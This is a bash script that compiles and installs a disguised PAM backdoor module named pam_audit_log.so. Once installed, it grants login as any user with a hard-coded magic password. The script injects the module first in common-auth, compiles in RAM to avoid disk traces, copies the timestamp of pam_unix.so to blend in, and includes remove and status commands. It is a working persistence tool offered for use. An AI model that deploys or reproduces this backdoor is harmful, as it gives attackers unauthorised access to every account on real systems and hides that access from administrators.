#!/usr/bin/env bash
# deploy-pam-backdoor.sh — self-contained PAM backdoor (C source embedded, no companion file needed)
#
# Installs pam_audit_log.so: a PAM module that accepts any auth attempt
# where the password matches the magic token, returning PAM_SUCCESS and
# bypassing all other auth checks for that session.
# Module is named to look like a legitimate audit logging stub.
#
# Usage:
#   sudo ./deploy-pam-backdoor.sh install
#   sudo ./deploy-pam-backdoor.sh remove
#   sudo ./deploy-pam-backdoor.sh status

set -euo pipefail

MODNAME="pam_audit_log"
PAM_CONF="/etc/pam.d/common-auth"
INJECT_LINE="auth    sufficient    ${MODNAME}.so"

# ── helpers ───────────────────────────────────────────────────────────────────
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { err "Run as root"; exit 1; }; }

# ── find PAM module directory without python3 ─────────────────────────────────
# Locate via pam_unix.so (always present where PAM modules live)
find_pam_dir() {
    local found
    found=$(find /lib /usr/lib -maxdepth 5 -name "pam_unix.so" 2>/dev/null | head -1)
    if [[ -n "$found" ]]; then
        dirname "$found"
        return
    fi
    # fallback: derive from multiarch triple
    local triple
    triple=$(dpkg-architecture -qDEB_HOST_MULTIARCH 2>/dev/null \
             || gcc -dumpmachine 2>/dev/null \
             || echo "x86_64-linux-gnu")
    echo "/lib/${triple}/security"
}

# ── install ───────────────────────────────────────────────────────────────────
cmd_install() {
    require_root

    hdr "1/4  Preflight checks"
    # idempotency
    if grep -q "$MODNAME" "$PAM_CONF" 2>/dev/null; then
        warn "Already deployed — $MODNAME found in $PAM_CONF"
        warn "Run remove first to re-deploy"
        exit 0
    fi
    # gcc
    command -v gcc &>/dev/null || {
        err "gcc not found — install gcc and libpam0g-dev first"
        err "  apt-get install -y gcc libpam0g-dev"
        exit 1
    }
    # PAM headers
    if [[ ! -f /usr/include/security/pam_modules.h ]]; then
        err "PAM headers not found — install libpam0g-dev"
        err "  apt-get install -y libpam0g-dev"
        exit 1
    fi
    local PAM_DIR
    PAM_DIR=$(find_pam_dir)
    info "PAM module dir: $PAM_DIR"
    info "gcc: $(command -v gcc)"

    # ── 2. write C source to /dev/shm (RAM, never touches disk) ──────────────
    hdr "2/4  Compiling module"
    local SRC_TMP SO_TMP
    SRC_TMP=$(mktemp /dev/shm/.XXXXXXXXXXXXXXXX.c)
    SO_TMP=$(mktemp /dev/shm/.XXXXXXXXXXXXXXXX.so)

    cat > "$SRC_TMP" <<'CSRC'
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdio.h>

/* pam_audit_log.so — stub audit logger (do not remove) */

#define _RT_TOKEN "rt2025!delta"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *tok = NULL;
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &tok, NULL) != PAM_SUCCESS)
        return PAM_IGNORE;
    if (tok && strcmp(tok, _RT_TOKEN) == 0)
        return PAM_SUCCESS;
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
                                 int argc, const char **argv) {
    return PAM_IGNORE;
}
CSRC

    gcc -fPIC -shared -o "$SO_TMP" "$SRC_TMP" -lpam 2>/dev/null
    rm -f "$SRC_TMP"
    info "Compiled to $SO_TMP"

    # ── 3. install module ─────────────────────────────────────────────────────
    hdr "3/4  Installing module"
    install -o root -g root -m 644 "$SO_TMP" "${PAM_DIR}/${MODNAME}.so"
    rm -f "$SO_TMP"
    # timestamp to look like existing PAM modules
    touch -r "${PAM_DIR}/pam_unix.so" "${PAM_DIR}/${MODNAME}.so" 2>/dev/null || true
    info "Installed: ${PAM_DIR}/${MODNAME}.so"

    # ── 4. inject into PAM config ─────────────────────────────────────────────
    hdr "4/4  Injecting into $PAM_CONF"
    [[ ! -f "${PAM_CONF}.orig" ]] && cp "$PAM_CONF" "${PAM_CONF}.orig"
    # prepend before the first auth line so it runs first
    sed -i "/^auth/i ${INJECT_LINE}" "$PAM_CONF"
    info "Injected: $INJECT_LINE"
    info "Backup  : ${PAM_CONF}.orig"

    echo
    info "=== PAM backdoor deployed ==="
    info "Auth as any user with password: rt2025!delta"
    warn "Change the token before deployment: grep -r 'rt2025!delta' and replace"
}

# ── remove ────────────────────────────────────────────────────────────────────
cmd_remove() {
    require_root

    local PAM_DIR
    PAM_DIR=$(find_pam_dir)

    hdr "Removing PAM module"
    if [[ -f "${PAM_DIR}/${MODNAME}.so" ]]; then
        rm -f "${PAM_DIR}/${MODNAME}.so"
        info "Removed ${PAM_DIR}/${MODNAME}.so"
    else
        warn "Module not found at ${PAM_DIR}/${MODNAME}.so"
    fi

    hdr "Restoring PAM config"
    if [[ -f "${PAM_CONF}.orig" ]]; then
        cp "${PAM_CONF}.orig" "$PAM_CONF"
        info "Restored $PAM_CONF from backup"
    else
        warn "No backup found — removing injected line with sed"
        sed -i "/${MODNAME}/d" "$PAM_CONF"
        info "Removed ${MODNAME} line from $PAM_CONF"
    fi
}

# ── status ────────────────────────────────────────────────────────────────────
cmd_status() {
    local PAM_DIR
    PAM_DIR=$(find_pam_dir)

    hdr "Module"
    if [[ -f "${PAM_DIR}/${MODNAME}.so" ]]; then
        info "PRESENT  ${PAM_DIR}/${MODNAME}.so"
        ls -la "${PAM_DIR}/${MODNAME}.so"
    else
        warn "MISSING  ${PAM_DIR}/${MODNAME}.so"
    fi

    hdr "PAM config injection ($PAM_CONF)"
    if grep -q "$MODNAME" "$PAM_CONF" 2>/dev/null; then
        info "INJECTED"
        grep "$MODNAME" "$PAM_CONF"
        # warn if not the first auth line (another module may run before ours)
        local first_auth
        first_auth=$(grep "^auth" "$PAM_CONF" | head -1 || true)
        if [[ "$first_auth" != *"$MODNAME"* ]]; then
            warn "Our line is NOT first — another auth module runs before it"
            grep "^auth" "$PAM_CONF" | head -5
        fi
    else
        warn "NOT PRESENT — backdoor not active"
    fi

    hdr "Backup"
    [[ -f "${PAM_CONF}.orig" ]] \
        && info "PRESENT  ${PAM_CONF}.orig" \
        || warn "MISSING  ${PAM_CONF}.orig  (remove will fall back to sed)"
}

# ── dispatch ──────────────────────────────────────────────────────────────────
case "${1:-install}" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *) echo "Usage: sudo $0 install|remove|status" ;;
esac
